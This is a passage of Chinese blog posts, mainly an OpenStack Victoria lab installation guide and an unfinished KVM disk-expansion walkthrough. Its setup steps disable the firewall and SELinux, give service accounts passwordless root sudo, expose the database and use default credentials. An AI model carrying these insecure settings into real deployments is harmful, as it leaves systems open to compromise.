主题创建、删除、扩容（删除需配置delete.topic.enable = true） broker状态监控 消费者组查看、删除 重置offset 消息查询（支持String和json方式展示） 发送消息（支持向指定的topic和partition发送字符串消息）  功能截图 添加集群 集群管理 broker 主题管理 消费组 查看消费组已订阅主题 topic详情——分区 topic详情——broker topic详情——消费组 topic详情——消费组重置offset topic详情——配置信息 生产消息 消费消息 docker 方式安装 一行命令即可完成安装\ndocker run -d \\  -p 8080:8080 \\  -v /opt/kafka-map/data:/usr/local/kafka-map/data \\  -e DEFAULT_USERNAME=admin -e DEFAULT_PASSWORD=admin --name kafka-map \\  --restart always dushixiang/kafka-map:latest 更多安装方式以及相信信息可查看: https://github.com/dushixiang/kafka-map\n欢迎star和分享给其他小伙伴。","title":"分享一款非常好用的kafka可视化web管理工具"},{"content":"近期公司业务需求，需要安装一套Openstack环境学习，看了一下现在已经出了wallaby版了，我果断选择了上一个版本victoria。因为没有足够多的物理服务器了，只好找了一台64核256G内存6T硬盘的机器来创建几台虚拟机来搭环境了。\n实验环境 此次实验使用到了三台虚拟机，都是使用centos8系统，一台机器当作控制和网络节点，另外两台当作计算节点，使用OVS+VLAN的网络模式，eth0作为管理网络，eth1互相连接到OVS网桥上模拟trunk网卡，controller多增加一个eth2用于访问外部网络。\n   节点 作用 eth0 eth1 eth2     controller 控制节点、网络节点 172.16.10.100 无IP 桥接，无IP   compute-101 计算节点 172.16.10.101 无IP ❌   compute-102 计算节点 172.16.10.102 无IP ❌    安装虚拟机 安装依赖 安装KVM和Linux网桥\nyum install -y qemu-kvm libvirt virt-install bridge-utils virt-manager dejavu-lgc-sans-fonts  dejavu-lgc-sans-fonts用于解决 virt-manaer 乱码\n 启动\nsystemctl enable libvirtd \u0026amp;\u0026amp; systemctl start libvirtd 安装OVS\nyum install openvswitch 启动OVS\nsystemctl enable openvswitch \u0026amp;\u0026amp; systemctl start openvswitch 创建虚拟机 使用 virt-manager 创建三台虚拟机\n配置网络 配置管理网卡 给虚拟机配置桥接网络，参考Linux虚拟化技术KVM，效果如图\n配置trunk网卡 使用ovs创建一个虚拟网桥。\novs-vsctl add-br br-vlan 此时网桥br-vlan上是没有任何虚拟网卡的，然后关闭虚拟机，在virt-manager上添加一个网络设备\n使用命令找到虚拟机并编辑虚拟机XML文件。\nvirsh list --all virsh edit controller 找到对应的 interface 元素，在 source 和 model中间添加一行。\n\u0026lt;virtualport type=\u0026#39;openvswitch\u0026#39; /\u0026gt; 然后保存退出，启动虚拟机，启动成功之后会 virtualport 中间生成一个新的元素。\n确认是否添加成功。\novs-vsctl show 成功的话可以在网桥上看到自动生成的几个虚拟网卡。\nBridge br-vlan Port br-vlan Interface br-vlan type: internal Port \u0026#34;vnet1\u0026#34; Interface \u0026#34;vnet1\u0026#34; Port \u0026#34;vnet2\u0026#34; Interface \u0026#34;vnet2\u0026#34; Port \u0026#34;vnet3\u0026#34; Interface \u0026#34;vnet3\u0026#34; ovs_version: \u0026#34;2.9.0\u0026#34; 以上步骤重复几次以完成其他虚拟机的配置。\n安装Openstack 配置环境 全部节点都需要操作。\n切换网络服务为 network-scripts # 安装Network服务 yum install network-scripts -y # 停用NetworkManager并禁止开机启动 systemctl stop NetworkManager \u0026amp;\u0026amp; systemctl disable NetworkManager # 启用Network并设置开机启动 systemctl enable network \u0026amp;\u0026amp; systemctl start network 设置静态IP 编辑网卡配置文件\nvim /etc/sysconfig/network-scripts/ifcfg-eth0 修改并添加以下内容\nBOOTPROTO=static ONBOOT=yes IPADDR=172.16.10.100 NETMASK=255.255.255.0 GATEWAY=172.16.0.1 重启网络\nsystemctl restart network 修改主机名称 # 修改控制节点 hostnamectl set-hostname controller # 修改计算节点compute-101 hostnamectl set-hostname compute-101 # 修改计算节点compute-102 hostnamectl set-hostname compute-102 修改hosts文件 添加以下内容\n172.16.10.100 controller 172.16.10.101 compute-101 172.16.10.102 compute-102 关闭防火墙 systemctl stop firewalld \u0026amp;\u0026amp; systemctl disable firewalld 安装基础服务 全部节点都需要操作。\n升级软件包 yum upgrade -y 安装时间同步服务chronyd  yum install chrony -y 计算节点修改配置文件 /etc/chrony.conf 中的 pool 2.centos.pool.ntp.org iburst 为 server controller iburst 直接与控制节点同步时间。\n重启chrony服务并开机自启\nsystemctl restart chronyd \u0026amp;\u0026amp; systemctl enable chronyd 安装openstack存储库 yum config-manager --enable powertools yum install centos-release-openstack-victoria -y 安装openstack客户端和openstack-selinux yum install python3-openstackclient openstack-selinux -y 禁用selinux cat\u0026gt;/etc/selinux/config\u0026lt;\u0026lt;EOF SELINUX=permissive SELINUXTYPE=targeted setenforce 0 EOF 修改用户权限 echo \u0026#34;neutron ALL = (root) NOPASSWD: ALL\u0026#34; \u0026gt; /etc/sudoers.d/neutron echo \u0026#34;nova ALL = (root) NOPASSWD: ALL\u0026#34; \u0026gt; /etc/sudoers.d/nova 控制节点 安装数据库   安装Mariadb数据库，也可安装MySQL数据库。\nyum install mariadb mariadb-server python3-PyMySQL -y   创建和编辑vim /etc/my.cnf.d/openstack.cnf文件，添加如下信息\n[mysqld] bind-address = 0.0.0.0 default-storage-engine = innodb innodb_file_per_table = on max_connections = 4096 collation-server = utf8_general_ci character-set-server = utf8   启动数据库并设置为开机自启\nsystemctl start mariadb \u0026amp;\u0026amp; systemctl enable mariadb   配置数据库\nmysql_secure_installation # 输入当前用户root密码，若为空直接回车 Enter current password for root (enter for none): OK, successfully used password, moving on... # 是否设置root密码 Set root password? [Y/n] y # 输入新密码 New password: # 再次输入新密码 Re-enter new password: # 是否删除匿名用户 Remove anonymous users? [Y/n] y # 是否禁用远程登录 Disallow root login remotely? [Y/n] n # 是否删除测试数据库 Remove test database and access to it? [Y/n] y # 是否重新加载权限表 Reload privilege tables now? [Y/n] y # 以上步骤根据实际情况做配置即可，不一定要与此处保持一致   安装消息队列   安装软件包\nyum install rabbitmq-server -y   启动消息队列服务并设置为开机自启\nsystemctl start rabbitmq-server \u0026amp;\u0026amp; systemctl enable rabbitmq-server   添加openstack用户并设置密码\nrabbitmqctl add_user openstack RABBIT_PASS   给openstack用户可读可写可配置权限\nrabbitmqctl set_permissions openstack \u0026#34;.*\u0026#34; \u0026#34;.*\u0026#34; \u0026#34;.*\u0026#34;   为了方便监控，启用Web界面管理插件\nrabbitmq-plugins enable rabbitmq_management   浏览器访问 IP:15672，使用 guest/guest 登录rabbitmq\n  安装Memcached缓存   安装软件包\nyum install memcached python3-memcached -y   编辑vim /etc/sysconfig/memcached文件，将OPTTONS行修改成如下信息\nOPTIONS=\u0026#34;-l 127.0.0.1,::1,controller\u0026#34;   启动Memcached服务并设置开机自启\nsystemctl start memcached \u0026amp;\u0026amp; systemctl enable memcached   安装KeyStone服务 创建数据库   连接数据库\nmysql -u root -p   创建keystone数据库\nCREATE DATABASE keystone;   授予keystone数据库权限，然后退出\nGRANT ALL PRIVILEGES ON keystone.* TO \u0026#39;keystone\u0026#39;@\u0026#39;localhost\u0026#39; IDENTIFIED BY \u0026#39;KEYSTONE_DBPASS\u0026#39;; GRANT ALL PRIVILEGES ON keystone.* TO \u0026#39;keystone\u0026#39;@\u0026#39;%\u0026#39; IDENTIFIED BY \u0026#39;KEYSTONE_DBPASS\u0026#39;; exit;   安装软件包   安装软件\nyum install openstack-keystone httpd python3-mod_wsgi -y   修改配置文件\ncat \u0026gt; /etc/keystone/keystone.conf \u0026lt;\u0026lt;EOF [DEFAULT] [database] connection = mysql+pymysql://keystone:KEYSTONE_DBPASS@controller/keystone [token] provider = fernet EOF   初始化数据库\nsu -s /bin/sh -c \u0026#34;keystone-manage db_sync\u0026#34; keystone   初始化Fernet\nkeystone-manage fernet_setup --keystone-user keystone --keystone-group keystone keystone-manage credential_setup --keystone-user keystone --keystone-group keystone   引导身份认证服务\nkeystone-manage bootstrap --bootstrap-password ADMIN_PASS \\  --bootstrap-admin-url http://controller:5000/v3/ \\  --bootstrap-internal-url http://controller:5000/v3/ \\  --bootstrap-public-url http://controller:5000/v3/ \\  --bootstrap-region-id RegionOne   配置Apache HTTP服务   修改vim /etc/httpd/conf/httpd.conf文件，添加如下信息\nServerName controller   创建软链接\nln -s /usr/share/keystone/wsgi-keystone.conf /etc/httpd/conf.d/   启动httpd服务 并设置开机自启\nsystemctl start httpd \u0026amp;\u0026amp; systemctl enable httpd   创建环境变量脚本\ncat \u0026gt; admin-openrc \u0026lt;\u0026lt;EOF export OS_USERNAME=admin export OS_PASSWORD=ADMIN_PASS export OS_PROJECT_NAME=admin export OS_USER_DOMAIN_NAME=Default export OS_PROJECT_DOMAIN_NAME=Default export OS_AUTH_URL=http://controller:5000/v3 export OS_IDENTITY_API_VERSION=3 export OS_IMAGE_API_VERSION=2 EOF 执行命令 source admin-openrc 或者 . admin-openrc 使环境变量生效。\n  创建域、项目、用户和角色   创建域，程序中已存在默认域，此命令只是一个创建域的例子，可以不执行\nopenstack domain create --description \u0026#34;An Example Domain\u0026#34; example   创建service项目，也叫做租户\nopenstack project create --domain default --description \u0026#34;Service Project\u0026#34; service   验证token令牌\nopenstack token issue   安装Glance服务 创建数据库   连接数据库\nmysql -u root -p   创建glance数据库\nCREATE DATABASE glance;   授予glance数据库权限，然后退出\nGRANT ALL PRIVILEGES ON glance.* TO \u0026#39;glance\u0026#39;@\u0026#39;localhost\u0026#39; IDENTIFIED BY \u0026#39;GLANCE_DBPASS\u0026#39;; GRANT ALL PRIVILEGES ON glance.* TO \u0026#39;glance\u0026#39;@\u0026#39;%\u0026#39; IDENTIFIED BY \u0026#39;GLANCE_DBPASS\u0026#39;; exit;   创建glance用户并关联角色   创建glance用户并设置密码为GLANCE_PASS，此处与上面创建用户的不同之处是未使用交互式的方式，直接将密码放入了命令中\nopenstack user create --domain default --password GLANCE_PASS glance   使用admin角色将Glance用户添加到服务项目中\n# 在service的项目上给glance用户关联admin角色 openstack role add --project service --user glance admin   创建glance服务并注册API   创建glance服务\nopenstack service create --name glance --description \u0026#34;OpenStack Image\u0026#34; image   注册API，也就是创建镜像服务的API终端endpoints\nopenstack endpoint create --region RegionOne image public http://controller:9292 openstack endpoint create --region RegionOne image internal http://controller:9292 openstack endpoint create --region RegionOne image admin http://controller:9292   安装并配置glance   安装软件包\ndnf install openstack-glance -y   修改配置文件\ncat \u0026gt; /etc/glance/glance-api.conf\u0026lt;\u0026lt;EOF [database] connection = mysql+pymysql://glance:GLANCE_DBPASS@controller/glance [keystone_authtoken] www_authenticate_uri = http://controller:5000 auth_url = http://controller:5000 memcached_servers = controller:11211 auth_type = password project_domain_name = Default user_domain_name = Default project_name = service username = glance password = GLANCE_PASS [paste_deploy] flavor = keystone [glance_store] stores = file,http default_store = file filesystem_store_datadir = /var/lib/glance/images/ EOF   同步数据库\nsu -s /bin/sh -c \u0026#34;glance-manage db_sync\u0026#34; glance   启动glance服务并设置开机自启\nsystemctl start openstack-glance-api \u0026amp;\u0026amp; systemctl enable openstack-glance-api   安装Placement服务 创建数据库   连接数据库\nmysql -u root -p   创建Plancement数据库\nCREATE DATABASE placement;   授予Plancement数据库权限，然后退出\nGRANT ALL PRIVILEGES ON placement.* TO \u0026#39;placement\u0026#39;@\u0026#39;localhost\u0026#39; IDENTIFIED BY \u0026#39;PLACEMENT_DBPASS\u0026#39;; GRANT ALL PRIVILEGES ON placement.* TO \u0026#39;placement\u0026#39;@\u0026#39;%\u0026#39; IDENTIFIED BY \u0026#39;PLACEMENT_DBPASS\u0026#39;; exit;   配置用户和Endpoint   创建一个plancement用户并设置密码为PLACEMENT_PASS\nopenstack user create --domain default --password PLACEMENT_PASS placement   使用admin角色将Placement用户添加到服务项目中\n# 在service的项目上给placement用户关联admin角色 openstack role add --project service --user placement admin   创建Placement服务并注册API   创建Plancement服务\nopenstack service create --name placement --description \u0026#34;Placement API\u0026#34; placement   创建Plancement服务API端口\nopenstack endpoint create --region RegionOne placement public http://controller:8778 openstack endpoint create --region RegionOne placement internal http://controller:8778 openstack endpoint create --region RegionOne placement admin http://controller:8778   安装Placement服务   安装Plancement软件包\nyum install openstack-placement-api -y   修改配置文件\ncat \u0026gt; /etc/placement/placement.conf \u0026lt;\u0026lt;EOF [placement_database] connection = mysql+pymysql://placement:PLACEMENT_DBPASS@controller/placement [api] auth_strategy = keystone [keystone_authtoken] auth_url = http://controller:5000/v3 memcached_servers = controller:11211 auth_type = password project_domain_name = Default user_domain_name = Default project_name = service username = placement password = PLACEMENT_PASS EOF   同步数据库\nsu -s /bin/sh -c \u0026#34;placement-manage db sync\u0026#34; placement   重启httpd服务\nsystemctl restart httpd   检查Placement服务状态\nplacement-status upgrade check   安装Nova服务 创建数据库   连接数据库\nmysql -u root -p   创建nova_api，nova和nova_cell0数据库\nCREATE DATABASE nova_api; CREATE DATABASE nova; CREATE DATABASE nova_cell0;   分别授予三个数据库权限，然后退出\n# 授权nova_api数据库 GRANT ALL PRIVILEGES ON nova_api.* TO \u0026#39;nova\u0026#39;@\u0026#39;localhost\u0026#39; IDENTIFIED BY \u0026#39;NOVA_DBPASS\u0026#39;; GRANT ALL PRIVILEGES ON nova_api.* TO \u0026#39;nova\u0026#39;@\u0026#39;%\u0026#39; IDENTIFIED BY \u0026#39;NOVA_DBPASS\u0026#39;; # 授权nova数据库 GRANT ALL PRIVILEGES ON nova.* TO \u0026#39;nova\u0026#39;@\u0026#39;localhost\u0026#39; IDENTIFIED BY \u0026#39;NOVA_DBPASS\u0026#39;; GRANT ALL PRIVILEGES ON nova.* TO \u0026#39;nova\u0026#39;@\u0026#39;%\u0026#39; IDENTIFIED BY \u0026#39;NOVA_DBPASS\u0026#39;; # 授权nova_cell0数据库 GRANT ALL PRIVILEGES ON nova_cell0.* TO \u0026#39;nova\u0026#39;@\u0026#39;localhost\u0026#39; IDENTIFIED BY \u0026#39;NOVA_DBPASS\u0026#39;; GRANT ALL PRIVILEGES ON nova_cell0.* TO \u0026#39;nova\u0026#39;@\u0026#39;%\u0026#39; IDENTIFIED BY \u0026#39;NOVA_DBPASS\u0026#39;; exit;   配置用户和Endpoint   创建nova用户并设置密码为NOVA_PASS\nopenstack user create --domain default --password NOVA_PASS nova   使用admin角色将nova用户添加到服务项目中\n# 在service的项目上给nova用户关联admin角色 openstack role add --project service --user nova admin   创建Nova服务并注册API   创建Nova服务\nopenstack service create --name nova --description \u0026#34;OpenStack Compute\u0026#34; compute   创建Nova服务API端口\nopenstack endpoint create --region RegionOne compute public http://controller:8774/v2.1 openstack endpoint create --region RegionOne compute internal http://controller:8774/v2.1 openstack endpoint create --region RegionOne compute admin http://controller:8774/v2.1   安装并配置Nova   安装nova相关软件包\nyum install openstack-nova-api openstack-nova-conductor openstack-nova-novncproxy openstack-nova-scheduler -y   修改配置文件\ncat \u0026gt; /etc/nova/nova.conf \u0026lt;\u0026lt;EOF [DEFAULT] enabled_apis = osapi_compute,metadata transport_url = rabbit://openstack:RABBIT_PASS@controller:5672/ my_ip = 172.16.10.100 [api_database] connection = mysql+pymysql://nova:NOVA_DBPASS@controller/nova_api [database] connection = mysql+pymysql://nova:NOVA_DBPASS@controller/nova [api] auth_strategy = keystone [keystone_authtoken] www_authenticate_uri = http://controller:5000/ auth_url = http://controller:5000/ memcached_servers = controller:11211 auth_type = password project_domain_name = Default user_domain_name = Default project_name = service username = nova password = NOVA_PASS [vnc] enabled = true server_listen = $my_ip server_proxyclient_address = $my_ip [glance] api_servers = http://controller:9292 [oslo_concurrency] lock_path = /var/lib/nova/tmp [placement] region_name = RegionOne project_domain_name = Default project_name = service auth_type = password user_domain_name = Default auth_url = http://controller:5000/v3 username = placement password = PLACEMENT_PASS   同步数据库\n# 同步nova_api数据库 su -s /bin/sh -c \u0026#34;nova-manage api_db sync\u0026#34; nova # 同步nova_cell0数据库 su -s /bin/sh -c \u0026#34;nova-manage cell_v2 map_cell0\u0026#34; nova # 创建cell1 su -s /bin/sh -c \u0026#34;nova-manage cell_v2 create_cell --name=cell1 --verbose\u0026#34; nova # 同步nova数据库 su -s /bin/sh -c \u0026#34;nova-manage db sync\u0026#34; nova 验证nova_cell0和cell1是否添加成功\nsu -s /bin/sh -c \u0026#34;nova-manage cell_v2 list_cells\u0026#34; nova   启动服务并设为开机自启\nsystemctl enable openstack-nova-api openstack-nova-scheduler openstack-nova-conductor openstack-nova-novncproxy systemctl start openstack-nova-api openstack-nova-scheduler openstack-nova-conductor openstack-nova-novncproxy   使用命令nova service-list验证服务是否启动成功\n  安装neutron服务 创建数据库   连接数据库\nmysql -u root -p   创建neutron数据库\nCREATE DATABASE neutron;   授予数据库权限，然后退出\nGRANT ALL PRIVILEGES ON neutron.* TO \u0026#39;neutron\u0026#39;@\u0026#39;localhost\u0026#39; IDENTIFIED BY \u0026#39;NEUTRON_DBPASS\u0026#39;; GRANT ALL PRIVILEGES ON neutron.* TO \u0026#39;neutron\u0026#39;@\u0026#39;%\u0026#39; IDENTIFIED BY \u0026#39;NEUTRON_DBPASS\u0026#39;; exit;   配置用户和Endpoint   创建neutron用户并设置密码为NEUTRON_PASS\nopenstack user create --domain default --password NEUTRON_PASS neutron   使用admin角色将neutron用户添加到服务项目中\n# 在service的项目上给neutron用户关联admin角色 openstack role add --project service --user neutron admin   创建Neutron服务并注册API   创建Neutron服务\nopenstack service create --name neutron --description \u0026#34;OpenStack Networking\u0026#34; network   创建Neutron服务API端口\nopenstack endpoint create --region RegionOne network public http://controller:9696 openstack endpoint create --region RegionOne network internal http://controller:9696 openstack endpoint create --region RegionOne network admin http://controller:9696   安装并配置neutron服务   安装neutron相关软件包\nyum install openstack-neutron openstack-neutron-ml2 openstack-neutron-openvswitch python-neutronclient openstack-neutron-fwaas -y   修改配置文件\ncat \u0026gt; /etc/neutron/neutron.conf \u0026lt;\u0026lt;EOF [database] connection = mysql+pymysql://neutron:NEUTRON_DBPASS@controller/neutron [DEFAULT] core_plugin = ml2 service_plugins = transport_url = rabbit://openstack:RABBIT_PASS@controller auth_strategy = keystone notify_nova_on_port_status_changes = true notify_nova_on_port_data_changes = true [keystone_authtoken] www_authenticate_uri = http://controller:5000 auth_url = http://controller:5000 memcached_servers = controller:11211 auth_type = password project_domain_name = default user_domain_name = default project_name = service username = neutron password = NEUTRON_PASS [nova] auth_url = http://controller:5000 auth_type = password project_domain_name = default user_domain_name = default region_name = RegionOne project_name = service username = nova password = NOVA_PASS [oslo_concurrency] lock_path = /var/lib/neutron/tmp EOF   配置ML2组件\ncat \u0026gt; /etc/neutron/plugins/ml2/ml2_conf.ini \u0026lt;\u0026lt;EOF [ml2] type_drivers = flat,vlan tenant_network_types = vlan mechanism_drivers = openvswitch debug=True [ml2_type_flat] [ml2_type_vlan] network_vlan_ranges =physnet1:1000:1999,physnet2 [ml2_type_vxlan] [securitygroup] enable_security_group = True enable_ipset = True firewall_driver = neutron.agent.linux.iptables_firewall.OVSHybridIptablesFirewallDriver [ovs] tenant_network_type = vlan bridge_mappings = physnet1:br-vlan,physnet2:br-ex EOF   配置L3代理商\ncat\u0026gt; /etc/neutron/l3_agent.ini\u0026lt;\u0026lt;EOF [DEFAULT] interface_driver = neutron.agent.linux.interface.OVSInterfaceDriver router_delete_namespaces = True external_network_bridge = verbose = True [fwaas] driver=neutron_fwaas.services.firewall.drivers.linux.iptables_fwaas.IptablesFwaasDriver enabled = True [agent] extensions = fwaas [ovs] EOF   配置DHCP代理商\ncat\u0026gt;/etc/neutron/dhcp_agent.ini\u0026lt;\u0026lt;EOF [DEFAULT] debug=True interface_driver = neutron.agent.linux.interface.OVSInterfaceDriver dhcp_driver = neutron.agent.linux.dhcp.Dnsmasq enable_isolated_metadata = True dnsmasq_config_file = /etc/neutron/dnsmasq-neutron.conf EOF echo \u0026#34;dhcp-option-force=26,1454\u0026#34; \u0026gt;/etc/neutron/dnsmasq-neutron.conf   配置metadata代理器\ncat\u0026gt; /etc/neutron/metadata_agent.ini \u0026lt;\u0026lt;EOF [DEFAULT] nova_metadata_host = controller metadata_proxy_shared_secret = METADATA_SECRET memcache_servers = controller:11211 EOF   配置OVS组件\ncat \u0026gt; /etc/neutron/plugins/ml2/openvswitch_agent.ini \u0026lt;\u0026lt;EOF [DEFAULT] [agent] [ovs] bridge_mappings = physnet1:br-vlan,physnet2:br-ex [securitygroup] firewall_driver=neutron.agent.linux.iptables_firewall.OVSHybridIptablesFirewallDriver enable_security_group=true [xenapi] EOF 配置OVS交换机\nsystemctl enable openvswitch.service --now systemctl status openvswitch.service # 用于联通虚拟机的网桥 ovs-vsctl add-br br-vlan ovs-vsctl add-port br-vlan eth1 # 用于联通外部网络的网桥 ovs-vsctl add-br br-ex ovs-vsctl add-port br-ex eth2   配置软链接\nln -s /etc/neutron/plugins/ml2/ml2_conf.ini /etc/neutron/plugin.ini   启动相关服务\nsystemctl enable neutron-openvswitch-agent neutron-l3-agent neutron-dhcp-agent neutron-metadata-agent neutron-ovs-cleanup openvswitch systemctl start neutron-openvswitch-agent neutron-l3-agent neutron-dhcp-agent neutron-metadata-agent openvswitch systemctl status neutron-openvswitch-agent neutron-l3-agent neutron-dhcp-agent neutron-metadata-agent openvswitch   测试\n. admin-openrc openstack network agent list   创建提供商网络（外部网络）\nprovider-physical-network表示使用的物理网络，与网络节点/etc/neutron/plugin.ini中的配置一致。\n. admin-openrc # 添加默认的端口安全组规则 openstack security group rule create --proto icmp default openstack security group rule create --proto tcp --dst-port 22 default openstack security group rule create --proto tcp --dst-port 3389 default openstack security group rule create --proto tcp --dst-port 80 default openstack security group rule create --proto tcp --dst-port 443 default openstack security group rule create --proto tcp --dst-port 123 default openstack security group rule create --proto tcp --dst-port 53 default openstack security group rule create --proto udp --dst-port 123 default openstack security group rule create --proto udp --dst-port 53 default openstack network create --share --external \\  --provider-physical-network physnet2 \\  --provider-network-type flat provider # 子网需要与真实环境一致 openstack subnet create --network provider \\  --allocation-pool start=192.168.68.10,end=192.168.68.250 \\  --dns-nameserver 1.2.4.8 --gateway 192.168.68.1 \\  --subnet-range 192.168.68.0/24 provider   计算节点 安装nova组件   安装软件包\nyum install openstack-nova-compute -y   修改配置文件\n 需手动修改vnc下的novncproxy_base_url\n cat \u0026gt; /etc/nova/nova.conf \u0026lt;\u0026lt;EOF [DEFAULT] enabled_apis = osapi_compute,metadata transport_url = rabbit://openstack:RABBIT_PASS@controller my_ip = 172.16.10.101 [api] auth_strategy = keystone [keystone_authtoken] www_authenticate_uri = http://controller:5000/ auth_url = http://controller:5000/ memcached_servers = controller:11211 auth_type = password project_domain_name = Default user_domain_name = Default project_name = service username = nova password = NOVA_PASS [neutron] auth_url = http://controller:5000 auth_type = password project_domain_name = default user_domain_name = default region_name = RegionOne project_name = service username = neutron password = NEUTRON_PASS service_metadata_proxy = true metadata_proxy_shared_secret = METADATA_SECRET [vnc] enabled = true server_listen = 0.0.0.0 server_proxyclient_address = $my_ip novncproxy_base_url = http://172.16.10.100:6080/vnc_auto.html [glance] api_servers = http://controller:9292 [oslo_concurrency] lock_path = /var/lib/nova/tmp [placement] region_name = RegionOne project_domain_name = Default project_name = service auth_type = password user_domain_name = Default auth_url = http://controller:5000/v3 username = placement password = PLACEMENT_PASS [libvirt] virt_type=qemu EOF   启动服务\nsystemctl enable libvirtd.service openstack-nova-compute.service --now systemctl status libvirtd.service openstack-nova-compute.service   控制端验证nova节点信息\n. admin-openrc su -s /bin/sh -c \u0026#34;nova-manage cell_v2 discover_hosts --verbose\u0026#34; nova openstack hypervisor list openstack compute service list openstack catalog list nova-status upgrade check   安装neutron组件   安装软件包\nyum install -y openstack-neutron openstack-neutron-ml2 openstack-neutron-openvswitch   修改配置文件\ncat \u0026gt; /etc/neutron/neutron.conf \u0026lt;\u0026lt;EOF [DEFAULT] transport_url = rabbit://openstack:RABBIT_PASS@controller auth_strategy = keystone [keystone_authtoken] www_authenticate_uri = http://controller:5000 auth_url = http://controller:5000 memcached_servers = controller:11211 auth_type = password project_domain_name = default user_domain_name = default project_name = service username = neutron password = NEUTRON_PASS [oslo_concurrency] lock_path = /var/lib/neutron/tmp EOF   配置OVS网桥\nsystemctl enable openvswitch --now systemctl status openvswitch ovs-vsctl add-br br-vlan ovs-vsctl add-port br-vlan eth1   配置neutron ovs组件\ncat\u0026gt;/etc/neutron/plugins/ml2/openvswitch_agent.ini\u0026lt;\u0026lt;EOF [DEFAULT] [agent] [ovs] bridge_mappings = physnet1:br-vlan [securitygroup] firewall_driver=neutron.agent.linux.iptables_firewall.OVSHybridIptablesFirewallDriver enable_security_group=True [xenapi] EOF   启动服务\n# 重启nova-compute systemctl restart openstack-nova-compute systemctl enable neutron-openvswitch-agent --now systemctl status neutron-openvswitch-agent   访问dashboard 使用浏览器访问 http://172.16.10.100/dashboard，使用admin/ADMIN_PASS登录系统。\n","permalink":"https://typesafe.cn/posts/install-openstack-victoria/","summary":"近期公司业务需求，需要安装一套Openstack环境学习，看了一下现在已经出了wallaby版了，我果断选择了上一个版本victoria。因为没有足够多的物理服务器了，只好找了一台64核256G内存6T硬盘的机器来创建几台虚拟机来搭环境了。\n实验环境 此次实验使用到了三台虚拟机，都是使用centos8系统，一台机器当作控制和网络节点，另外两台当作计算节点，使用OVS+VLAN的网络模式，eth0作为管理网络，eth1互相连接到OVS网桥上模拟trunk网卡，controller多增加一个eth2用于访问外部网络。\n   节点 作用 eth0 eth1 eth2     controller 控制节点、网络节点 172.16.10.100 无IP 桥接，无IP   compute-101 计算节点 172.16.10.101 无IP ❌   compute-102 计算节点 172.16.10.102 无IP ❌    安装虚拟机 安装依赖 安装KVM和Linux网桥\nyum install -y qemu-kvm libvirt virt-install bridge-utils virt-manager dejavu-lgc-sans-fonts  dejavu-lgc-sans-fonts用于解决 virt-manaer 乱码\n 启动\nsystemctl enable libvirtd \u0026amp;\u0026amp; systemctl start libvirtd 安装OVS\nyum install openvswitch 启动OVS\nsystemctl enable openvswitch \u0026amp;\u0026amp; systemctl start openvswitch 创建虚拟机 使用 virt-manager 创建三台虚拟机","title":"openstack victoria版安装"},{"content":"一、镜像扩容 注意：需要先关闭虚拟机才能操作，+号前面有空格，后面没有空格。\nqemu-img resize test.qcow2 +80G 原镜像磁盘大小20GB，扩容完成后可使用以下命令查看\nqemu-img info test.qcow2 输出\nimage: test.qcow2 file format: qcow2 virtual size: 100G (107374182400 bytes) disk size: 885M cluster_size: 65536 Format specific information: compat: 1.1 lazy refcounts: false refcount bits: 16 corrupt: false 二、Windows磁盘扩容 Windows磁盘扩容比较方便，进入 计算机管理\u0026gt;磁盘管理 找到新增的分区把它添加到需要的分区即可。\n三、Linux磁盘扩容 启动虚拟机后，进入虚拟机控制台，使用fdisk -l命令查看磁盘信息。\nDisk /dev/vda: 100 GiB, 107374182400 bytes, 209715200 sectors Units: sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes Disklabel type: dos Disk identifier: 0xe11f7f01 Device Boot Start End Sectors Size Id Type /dev/vda1 * 2048 2099199 2097152 1G 83 Linux /dev/vda2 2099200 41943039 39843840 19G 8e Linux LVM Disk /dev/mapper/cl-root: 17 GiB, 18249416704 bytes, 35643392 sectors Units: sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes Disk /dev/mapper/cl-swap: 2 GiB, 2147483648 bytes, 4194304 sectors Units: sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes 可以看到这台虚拟机的磁盘大小已经有100GB了，但分区大小还是没有变化，只有初始大小20GB。\n使用命令fdisk /dev/vda进行分区管理。\nWelcome to fdisk (util-linux 2.32.1). Changes will remain in memory only, until you decide to write them. Be careful before using the write command. Command (m for help): n 输入 n 创建一个新分区并回车。\nPartition type p primary (2 primary, 0 extended, 2 free) e extended (container for logical partitions) Select (default p): p 提示选择分区，输入 p 选择主分区并回车。\nPartition number (3,4, default 3): 提示选择分区编号，直接回车。\nFirst sector (41943040-209715199, default 41943040): Last sector, +sectors or +size{K,M,G,T,P} (41943040-209715199, default 209715199): Created a new partition 3 of type \u0026#39;Linux\u0026#39; and of size 80 GiB. Command (m for help): t 输入t修改磁盘格式。\nPartition number (1-3, default 3): Hex code (type L to list all codes): 8e Changed type of partition 'Linux' to 'Linux LVM'. Command (m for help): w 提示选择分区直接回车，提示选择十六进制编码，输入8e并回车，最后输入w保存并退出此流程。\n再次输入fdisk -l 查看磁盘信息。\nDisk /dev/vda: 100 GiB, 107374182400 bytes, 209715200 sectors Units: sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes Disklabel type: dos Disk identifier: 0xe11f7f01 Device Boot Start End Sectors Size Id Type /dev/vda1 * 2048 2099199 2097152 1G 83 Linux /dev/vda2 2099200 41943039 39843840 19G 8e Linux LVM /dev/vda3 41943040 209715199 167772160 80G 8e Linux LVM Disk /dev/mapper/cl-root: 17 GiB, 18249416704 bytes, 35643392 sectors Units: sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes Disk /dev/mapper/cl-swap: 2 GiB, 2147483648 bytes, 4194304 sectors Units: sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes 可以看到已经多了一个/dev/vda3分区，并且大小为80GB。\n创建一个新的pv并添加到要扩容的vg中。\n[root@localhost ~]# pvcreate /dev/vda3 Physical volume \u0026quot;/dev/vda3\u0026quot; successfully created. [root@localhost ~]# [root@localhost ~]# vgextend cl /dev/vda3 Volume group \u0026quot;cl\u0026quot; successfully extended [root@localhost ~]# 使用vgdisplay可以查看到已经扩容。\n[root@localhost 